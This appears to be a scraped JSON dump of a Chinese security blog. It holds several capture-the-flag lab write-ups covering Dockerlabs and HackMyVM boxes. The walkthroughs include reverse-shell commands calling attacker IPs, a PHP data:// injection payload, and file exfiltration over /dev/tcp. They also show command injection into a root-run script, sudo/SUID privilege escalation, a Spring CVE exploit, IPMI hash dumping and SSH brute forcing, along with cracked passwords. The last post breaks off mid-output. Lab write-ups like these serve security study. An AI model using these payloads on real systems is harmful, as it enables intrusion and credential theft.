/usr/local/bin/wp --exec=\u0026#39;system(\u0026#34;id\u0026#34;);\u0026#39; sudo -u wpuser /usr/local/bin/wp --exec=\u0026#39;system(\u0026#34;id\u0026#34;);\u0026#39; uid=1002(wpuser) gid=1002(wpuser) groups=1002(wpuser),100(users)\rsh: 1: less: not found\rapp@3b66fe911993:~$ 这里我是先写入的恶意代码文件，然后再去执行他\napp@3b66fe911993:/tmp$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.1/6789 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;shell\recho \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.1/6789 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;shell\rapp@3b66fe911993:/tmp$ cat shell\rcat shell\rbash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.1/6789 0\u0026gt;\u0026amp;1\rapp@3b66fe911993:~$ chmod +x /tmp/shell\rchmod +x /tmp/shell\rapp@3b66fe911993:~$ sudo -u wpuser /usr/local/bin/wp --exec=\u0026#39;system(\u0026#34;bash /tmp/shell\u0026#34;);\u0026#39; Root #\r查看一下sudo\nwpuser@3b66fe911993:~$ sudo -l\rsudo -l\rMatching Defaults entries for wpuser on 3b66fe911993:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\ruse_pty\rUser wpuser may run the following commands on 3b66fe911993:\r(root) NOPASSWD: /opt/scripts/backup.sh 查看一下具体内容\n#!/bin/bash\r# Author: Álvaro Bernal (aka. trr0r)\r# backup.sh: Realiza una copia de un log en una ubicación determinada (/backup)\r# COLORES\rgreenColour=\u0026#34;\\e[0;32m\\033[1m\u0026#34;\rendColour=\u0026#34;\\033[0m\\e[0m\u0026#34;\rredColour=\u0026#34;\\e[0;31m\\033[1m\u0026#34;\rblueColour=\u0026#34;\\e[0;34m\\033[1m\u0026#34;\ryellowColour=\u0026#34;\\e[0;33m\\033[1m\u0026#34;\rpurpleColour=\u0026#34;\\e[0;35m\\033[1m\u0026#34;\rturquoiseColour=\u0026#34;\\e[0;36m\\033[1m\u0026#34;\rgrayColour=\u0026#34;\\e[0;37m\\033[1m\u0026#34;\rorangeColour=\u0026#34;\\e[38;5;214m\\033[1m\u0026#34;\rdarkRedColour=\u0026#34;\\e[38;5;124m\\033[1m\u0026#34;\rif [ $# -eq 0 ]; then\recho -e \u0026#34;\\n${redColour}[!] Error, debes de proporcionar un argumento.${endColour}\\n\\n\\t${blueColour}Example:${endColour} ${greenColour}/opt/scripts/backup.sh access${endColour}\\n\u0026#34;\rexit\rfi\r# Variables GLOBALES\rLOG_DIR=\u0026#34;/var/log/apache2\u0026#34;\rBACKUP_DIR=\u0026#34;/backup\u0026#34;\rLOG_NAME=$1\rFULL_NAME=\u0026#34;$LOG_DIR/$LOG_NAME.log\u0026#34;\r/usr/bin/echo \u0026#34;Realizando copia de $FULL_NAME en $BACKUP_DIR\u0026#34;\rCOMMAND=\u0026#34;/usr/bin/cp $FULL_NAME $BACKUP_DIR\u0026#34;\reval $COMMAND 可以发现传入参数并没有经过任何过滤就直接拼接的，因此可以尝试进行命令注入\nwpuser@3b66fe911993:/tmp$ sudo -u root /opt/scripts/backup.sh \u0026#34;../../../tmp/a; touch /tmp/ppp;\u0026#34; wpuser@3b66fe911993:/tmp$ sudo -u root /opt/scripts/backup.sh \u0026#34;../../../tmp/a; chmod u+s /bin/bash;\u0026#34; Summary #\rUser：通过登录失败插入PHP代码到User-Agent，在debuglog里可以触发，反弹shell拿到www-data。内网端口5000上的flask服务通过设置HOST来进入到**/console**，执行任意命令拿到app。再通过wp-cli的php命令执行拿到wpuser。\nRoot：脚本中的参数可以使用分号进行拼接绕过，达到任意命令执行。\n","date":"2025-04-25","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-bicho/","section":"Posts","summary":"","title":"Dockerlabs-Bicho","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficult Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.55.13 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\r| ssh-hostkey: | 2048 ac:78:16:74:49:a1:68:9d:54:84:8a:59:e9:38:10:bc (RSA)\r| 256 06:0c:4d:9d:2c:32:43:d2:3d:f7:4f:82:c8:15:85:60 (ECDSA)\r|_ 256 3b:cd:fc:1f:dd:48:0f:ee:17:78:9a:f1:09:cb:8c:ec (ED25519)\r7577/tcp open http Apache Tomcat (language: en)\r| http-title: Site doesn\u0026#39;t have a title (application/hal+json).\r|_Requested resource was http://192.168.55.13:7577/api\r| http-methods: |_ Potentially risky methods: PUT PATCH DELETE\r9393/tcp open http Apache Tomcat (language: en)\r| http-methods: |_ Potentially risky methods: PUT PATCH DELETE\r|_http-title: Site doesn\u0026#39;t have a title (application/hal+json). CVE-2024-37084 #\r进入到9393端口的dashboard\n经过搜索得知：Ly4j/CVE-2024-37084-Exp: Spring Cloud Data Flow CVE-2024-37084 exp\n这里我使用的kali的java版本可能不对，生成的jar包无法完成反弹shell\n于是jar包的制作我是在windows上进行的\n需要注意的是，执行一次poc，就要给修改一次jar包的名称\nDocker break #\r当前环境是在docker里的，查找有SUID的文件\ncnb@921567b128b2:/workspace$ find / -user root -perm -4000 -print 2\u0026gt;/dev/null\rfind / -user root -perm -4000 -print 2\u0026gt;/dev/null\r/bin/mount\r/bin/su\r/bin/umount\r/usr/bin/chfn\r/usr/bin/chsh\r/usr/bin/gpasswd\r/usr/bin/newgrp\r/usr/bin/passwd\r/usr/local/bin/wget 可以利用wget进行提权：wget | GTFOBins\ncnb@921567b128b2:/workspace$ TF=$(mktemp)\rTF=$(mktemp)\rcnb@921567b128b2:/workspace$ chmod +x $TF\rchmod +x $TF\rcnb@921567b128b2:/workspace$ echo -e \u0026#39;#!/bin/sh -p\\n/bin/sh -p 1\u0026gt;\u0026amp;0\u0026#39; \u0026gt;$TF\recho -e \u0026#39;#!/bin/sh -p\\n/bin/sh -p 1\u0026gt;\u0026amp;0\u0026#39; \u0026gt;$TF\rcnb@921567b128b2:/workspace$ /usr/local/bin/wget --use-askpass=$TF 0 /usr/local/bin/wget --use-askpass=$TF 0\rwhoami\rroot\rid\ruid=1000(cnb) gid=1000(cnb) euid=0(root) egid=0(root) groups=0(root),1000(cnb) 先查看一下留言\ncat /home/cnb/note\rHi mathlake\rLong time no see, 256 is my favorite number. I know you are very interested in mathematics, but I have been struggling with a math problem recently. The method used is time series decomposition. I have sent you the data, and you can provide me with the mathematical expressions for T, S, and C (rounded to the nearest integer) corresponding to the month.\rJune 2025\r好久不见了，256是我最喜欢的号码。我知道你对数学很感兴趣，但最近我一直在努力解决一个数学问题。使用的方法是时间序列分解。我已经向您发送了数据，您可以为我提供与月份相对应的T、S和C（舍入到最接近的整数）的数学表达式。\r2025年6月 进入到邮箱里拿到三个文件\ncd /var/mail/mathlake\rls -al\rtotal 28\rdrwx--S---. 2 root mail 55 Mar 12 01:47 .\rdrwxrwsr-x. 1 root mail 22 Mar 12 01:41 ..\r-rw-r--r--. 1 root mail 10299 Mar 7 08:14 data.xlsx\r-rw-r--r--. 1 root mail 3906 Mar 11 23:56 test.png\r-rw-r--r--. 1 root mail 8815 Mar 11 23:58 true.png 可以转base64然后到本地又转回去，这样的方式来传递\ncat data.xlsx | base64 可以看到三个数字的大小范围\n因此可以写一个脚本来进行爆破\n#!/bin/bash\routput_file=\u0026#34;sha256_results.txt\u0026#34;\rfor i in {40..60}; do\rfor j in {0..2}; do\rfor k in {0..2}; do\recho \u0026#34;${i}*${j}*${k}\u0026#34; | sha256sum \u0026gt;\u0026gt; \u0026#34;$output_file\u0026#34;\rdone\rdone\rdone 然后用awk取出第一列\n[root@kali] /home/kali/mathdop ❯ awk \u0026#39;{print $1}\u0026#39; sha256_results.txt \u0026gt; passwords 由于**/var/mail中的用户名是mathlake**，可以尝试用这个来进行爆破\n[root@kali] /home/kali/mathdop ❯ hydra -l mathlake -P passwords ssh://192.168.55.13 -I Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-23 09:52:52\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 189 login tries (l:1/p:189), ~12 tries per task\r[DATA] attacking ssh://192.168.55.13:22/\r[22][ssh] host: 192.168.55.13 login: mathlake password: 9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3\r1 of 1 target successfully completed, 1 valid password found\r[WARNING] Writing restore file because 4 final worker threads did not complete until end.\r[ERROR] 4 targets did not resolve or could not be connected\r[ERROR] 0 target did not complete Root #\r[mathlake@mathdop ~]$ sudo -l\rMatching Defaults entries for mathlake on mathdop:\r!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR\rLS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT\rLC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET\rXAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\rUser mathlake may run the following commands on mathdop:\r(ALL) NOPASSWD: /opt/secure_input_handler.sh\r[mathlake@mathdop ~]$ cat /opt/secure_input_handler.sh #!/bin/bash\rexport PATH=\u0026#34;/usr/bin\u0026#34;\rread -p \u0026#34;Input Command: \u0026#34; user_input\rdecoded_input=$(echo -n \u0026#34;$user_input\u0026#34; | base64 -d 2\u0026gt;/dev/null | tr -d \u0026#39;\\r\\0\\a\u0026#39; | col -b)\rif [[ ${#user_input} -gt 128 || -z \u0026#34;$decoded_input\u0026#34; ]]; then\recho \u0026#34;[!] Decoding failed or input is too long\u0026#34; \u0026gt;\u0026amp;2\rexit 2\rfi\rfiltered_input=$(echo \u0026#34;$decoded_input\u0026#34; | tr -cd \u0026#39;a-zA-Z0-9\\-_/ :.\u0026#39; | sed -e \u0026#39;s/[[:space:]]\\+/ /g\u0026#39; -e \u0026#39;s/^[ \\t]*//\u0026#39; -e \u0026#39;s/[ \\t]*$//\u0026#39;)\rIFS=\u0026#39; \u0026#39; read -ra cmd_args \u0026lt;\u0026lt;\u0026lt; \u0026#34;$filtered_input\u0026#34;\rcommand=\u0026#34;${cmd_args[0]}\u0026#34;\rcommand_clean=$(echo \u0026#34;$command\u0026#34; | tr -d -c \u0026#39;a-zA-Z0-9\u0026#39;)\rallowed_commands=(\u0026#34;date\u0026#34; \u0026#34;pwd\u0026#34; \u0026#34;echo\u0026#34;)\rif ! printf \u0026#34;%s\\n\u0026#34; \u0026#34;${allowed_commands[@]}\u0026#34; | grep -qxF \u0026#34;$command_clean\u0026#34;; then\recho \u0026#34;[!] Illegal instruction: $command_clean\u0026#34; \u0026gt;\u0026amp;2\rexit 3\rfi\r/usr/bin/timeout 2 /usr/bin/bash -c \u0026#34;${filtered_input}\u0026#34; 这里并不能执行命令，查看一下**/etc/shadow**\ndate -f /etc/shadow\rZGF0ZSAtZiAvZXRjL3NoYWRvdw== 这个就是root的密码\n有点脑洞哈~\nSummary #\rUser：Spring框架漏洞，docker逃逸，拿到邮箱里的东西，可以尝试爆破密码，登录到mathdop\nRoot：读取**/etc/shadow**里面的密码\n","date":"2025-04-24","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-mathdop/","section":"Posts","summary":"","title":"HackMyVM-Mathdop","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/atom ❯ nmap 192.168.55.12 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\r| ssh-hostkey: | 256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)\r|_ 256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519) 只有22端口开放？有趣\n扫一下UDP端口\n[root@kali] /home/kali/atom ❯ nmap 192.168.55.12 -sU --top-ports 100 ⏎\rPORT STATE SERVICE\r623/udp open asf-rmcp IPMI #\rIPMI（智能平台管理接口）能够横跨不同的操作系统、固件和硬件平台，可以智能的监视、控制和自动回报大量服务器的运作状况，以降低服务器系统成本。\n参考：623/UDP/TCP - IPMI - HackTricks\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; show options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):\rName Current Setting Required Description\r---- --------------- -------- -----------\rCRACK_COMMON true yes Automatically crack common passwords as they are obtained\rOUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format\rOUTPUT_JOHN_FILE output no Save captured password hashes in john the ripper format\rPASS_FILE /usr/share/metasploit-framework/data/ yes File containing common passwords for offline cracking, one per line\rwordlists/ipmi_passwords.txt\rRHOSTS 192.168.55.12 yes The target host(s), see https://docs.metasploit.com/docs/using-metas\rploit/basics/using-metasploit.html\rRPORT 623 yes The target port\rSESSION_MAX_ATTEMPTS 5 yes Maximum number of session retries, required on certain BMCs (HP iLO\r4, etc)\rSESSION_RETRY_DELAY 5 yes Delay between session retries in seconds\rTHREADS 1 yes The number of concurrent threads (max one per host)\rUSER_FILE /usr/share/seclists/Usernames/Names/n yes File containing usernames, one per line\rames.txt\rView the full module info with the info, or info -d command. 然后进行密码爆破\n[root@kali] /home/kali/atom ❯ john output --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8\rLoaded 36 password hashes with 36 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 AVX 4x])\rWill run 8 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rphones (192.168.55.12 palmer) castillo1 (192.168.55.12 stacey) 2468 (192.168.55.12 carsten) milo123 (192.168.55.12 deshawn) jiggaman (192.168.55.12 onida) sexymoma (192.168.55.12 terra) me4life (192.168.55.12 sibylle) chatroom (192.168.55.12 fabien) 122987 (192.168.55.12 cati) mackenzie2 (192.168.55.12 merola) TWEETY1 (192.168.55.12 asia) 10101979 (192.168.55.12 wai-ching) jesus06 (192.168.55.12 briella) jaffa1 (192.168.55.12 ranga) 071590 (192.168.55.12 harrie) number17 (192.168.55.12 jerrilee) darell (192.168.55.12 richardson) billandben (192.168.55.12 kalie) honda (192.168.55.12 analiese) kittyboo (192.168.55.12 shirin) 515253 (192.168.55.12 pauly) 290992 (192.168.55.12 bqb) poynter (192.168.55.12 zali) numberone (192.168.55.12 kaki) djones (192.168.55.12 riyaz) 090506 (192.168.55.12 saman) emeralds (192.168.55.12 karlotte) 081704 (192.168.55.12 jem) 120691 (192.168.55.12 zaylen) tripod (192.168.55.12 ende) 241107 (192.168.55.12 mayeul) trick1 (192.168.55.12 laten) evan (192.168.55.12 glynn) batman! (192.168.55.12 rozalia) dezzy (192.168.55.12 els) cukorborso (192.168.55.12 admin) 扔给Hydra尝试爆破登录\n[root@kali] /home/kali/atom ❯ hydra -C cred ssh://192.168.55.12 -I ⏎\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-21 23:13:39\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 37 login tries, ~3 tries per task\r[DATA] attacking ssh://192.168.55.12:22/\r[22][ssh] host: 192.168.55.12 login: onida password: jiggaman\r1 of 1 target successfully completed, 1 valid password found\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-21 23:13:48 Root #\r注意到机器中存在docker环境\nonida@atom:/tmp$ ip a\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever\r2: enp0s3: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\rlink/ether 08:00:27:5c:29:73 brd ff:ff:ff:ff:ff:ff\rinet 192.168.55.12/24 brd 192.168.55.255 scope global dynamic noprefixroute enp0s3\rvalid_lft 357sec preferred_lft 357sec\rinet6 fe80::1c10:8025:62af:f8b/64 scope link noprefixroute valid_lft forever preferred_lft forever\r3: docker0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:e1:81:99:86 brd ff:ff:ff:ff:ff:ff\rinet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\rvalid_lft forever preferred_lft forever\rinet6 fe80::42:e1ff:fe81:9986/64 scope link valid_lft forever preferred_lft forever\r5: veth3316341@if4: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue master docker0 state UP group default link/ether 5e:24:c1:41:22:74 brd ff:ff:ff:ff:ff:ff link-netnsid 0\rinet6 fe80::5c24:c1ff:fe41:2274/64 scope link valid_lft forever preferred_lft forever 并且有内网端口开放\nonida@atom:/tmp$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 0.0.0.0:623 0.0.0.0:* tcp LISTEN 0 4096 0.0.0.0:623 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:41553 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:80 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* 先查看一下网站目录\nonida@atom:/var/www/html$ ls -al\rtotal 172\rdrwxr-xr-x 6 www-data www-data 4096 May 27 2024 .\rdrwxr-xr-x 3 root root 4096 May 25 2024 ..\r-rwxr-xr-x 1 www-data www-data 114688 May 27 2024 atom-2400-database.db\rdrwxr-xr-x 2 www-data www-data 4096 Dec 31 2400 css\rdrwxr-xr-x 4 www-data www-data 4096 Dec 31 2400 img\r-rw-r--r-- 1 www-data www-data 11767 Dec 31 2400 index.php\rdrwxr-xr-x 2 www-data www-data 4096 Dec 31 2400 js\r-rw-r--r-- 1 www-data www-data 6262 Dec 31 2400 login.php\r-rwxr-xr-x 1 www-data www-data 1637 Dec 31 2400 profile.php\r-rw-r--r-- 1 www-data www-data 5534 Dec 31 2400 register.php\rdrwxr-xr-x 2 www-data www-data 4096 Dec 31 2400 video 将这个数据库文件转出来\nonida@atom:/var/www/html$ caat atom-2400-database.db \u0026gt; /dev/tcp/192.168.55.4/8888\r[root@kali] /home/kali/atom ❯ nc -lvnp 8888 \u0026gt; atom-2400-database.db\rlistening on [any] 8888 ...\rconnect to [192.168.55.4] from (UNKNOWN) [192.168.55.12] 54048 爆破密码\n[root@kali] /home/kali/atom ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\rCost 1 (iteration count) is 1024 for all loaded hashes\rWill run 8 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rmadison (?) 1g 0:00:00:00 DONE (2025-04-21 23:22) 1.470g/s 317.6p/s 317.6c/s 317.6C/s alejandro..jessie\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. Summary #\rUser：通过IPMI服务泄露出用户密码，进行ssh登录爆破\nRoot：数据库文件解密，得到root密码\n","date":"2025-04-22","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-atom/","section":"Posts","summary":"","title":"HackMyVM-Atom","type":"posts"},{"content":"","date":"2025-04-22","externalUrl":null,"permalink":"/tags/vulnvm/","section":"Tags","summary":"","title":"Vulnvm","type":"tags"},{"content":"","date":"2025-04-22","externalUrl":null,"permalink":"/categories/vulnvm/","section":"Categories","summary":"","title":"Vulnvm","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.55.11 -sV -A -p- Not shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 69:dc:67:49:10:2a:a4:26:a8:9f:c4:5d:a3:b8:a1:3e (ECDSA)\r|_ 256 6a:2b:e4:44:29:78:62:fb:61:0b:09:2f:9c:bc:18:c6 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) Feroxbuster #\r[root@kali] /home/kali ❯ feroxbuster -u \u0026#39;http://192.168.55.11/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.11/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [php]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 0l 0w 0c http://192.168.55.11/contact.php\r200 GET 25l 127w 10359c http://192.168.55.11/icons/openlogo-75.png\r200 GET 368l 933w 10701c http://192.168.55.11/\r[####################] - 19s 220551/220551 0s found:3 errors:0 [####################] - 18s 220546/220546 12201/s http://192.168.55.11/ 其中contact.php并没有任何回显，尝试参数爆破\nFFUF #\r[root@kali] /home/kali ❯ ffuf -u \u0026#39;http://192.168.55.11/contact.php?FUZZ=/etc/passwd\u0026#39; -w /usr/share/fuzzDicts/paramDict/AllParam.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.55.11/contact.php?FUZZ=/etc/passwd\r:: Wordlist : FUZZ: /usr/share/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\rpage [Status: 200, Size: 1907, Words: 17, Lines: 36, Duration: 2ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:05] :: Errors: 0 :: 发现可以读取文件，也可以直接利用伪协议\nhttp://192.168.55.11/contact.php?page=data://text/plain,\u0026lt;?php system(\u0026#39;id\u0026#39;);?\u0026gt; http://192.168.55.11/contact.php?page=data://text/plain,\u0026lt;?php system(\u0026#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41NS40LzQ0NDQgMD4mMSkgJg==|base64 -d|bash\u0026#39;)?\u0026gt; Zip Crack #\rwww-data@debian:/var/www$ cat secure.zip \u0026gt; /dev/tcp/192.168.55.4/8888\r[root@kali] /home/kali/temp ❯ nc -lvnp 8888 \u0026gt; secure.zip listening on [any] 8888 ...\rconnect to [192.168.55.4] from (UNKNOWN) [192.168.55.11] 42980\r[root@kali] /home/kali/temp ❯ zip2john secure.zip \u0026gt;\u0026gt; zip.hash ⏎\rver 2.0 efh 5455 efh 7875 secure.zip/password.txt PKZIP Encr: TS_chk, cmplen=96, decmplen=90, crc=4ADB6ACA ts=ABFC cs=abfc type=8\r[root@kali] /home/kali/temp ❯ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8\rLoaded 1 password hash (PKZIP [32/64])\rWill run 8 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rbutterfly (secure.zip/password.txt) 1g 0:00:00:00 DONE (2025-04-21 22:09) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. [root@kali] /home/kali/temp ❯ unzip secure.zip\rArchive: secure.zip\r[secure.zip] password.txt password: inflating: password.txt [root@kali] /home/kali/temp ❯ cat password.txt Hello your admin here, I have left your password down below for you to use!\r32(srT1Rne.Y 得到support用户的密码\nRoot #\rsupport@debian:~$ sudo -l\rMatching Defaults entries for support on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser support may run the following commands on debian:\r(ALL) NOPASSWD: /usr/bin/awk awk | GTFOBins 可以利用awk直接读取root.txt\nsupport@debian:~$ sudo /usr/bin/awk \u0026#39;//\u0026#39; /root/root.txt 也可以开启一个shell\nsupport@debian:~$ sudo /usr/bin/awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39;\r# whoami\rroot\r# id\ruid=0(root) gid=0(root) groups=0(root) Summary #\rUser：目录扫描，参数FUZZ，通过伪协议拿到www-data，爆破压缩包拿到support的密码\nRoot：awk提权\n","date":"2025-04-22","externalUrl":null,"permalink":"/posts/2025/04/vulnvm-get/","section":"Posts","summary":"","title":"VulnVM-Get","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/hackingtoys ❯ nmap 192.168.55.10 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\r| ssh-hostkey: | 256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)\r|_ 256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)\r3000/tcp open ssl/ppp?\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR\r| Not valid before: 2024-05-20T15:36:20\r|_Not valid after: 2038-01-27T15:36:20\r| fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request\r| Content-Length: 930\r| Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `execute\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `try_to_finish\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:298:in `reactor_wakeup\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:248:in `block in run\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:119:in `wakeup!\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `block in select_loop\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select_loop\u0026#39;\r| /usr/loc\r| GetRequest: | HTTP/1.0 403 Forbidden\r| content-type: text/html; charset=UTF-8\r| Content-Length: 5702\r| \u0026lt;!DOCTYPE html\u0026gt;\r| \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r| \u0026lt;head\u0026gt;\r| \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt;\r| \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt;\r| \u0026lt;meta name=\u0026#34;turbo-visit-control\u0026#34; content=\u0026#34;reload\u0026#34;\u0026gt;\r| \u0026lt;title\u0026gt;Action Controller: Exception 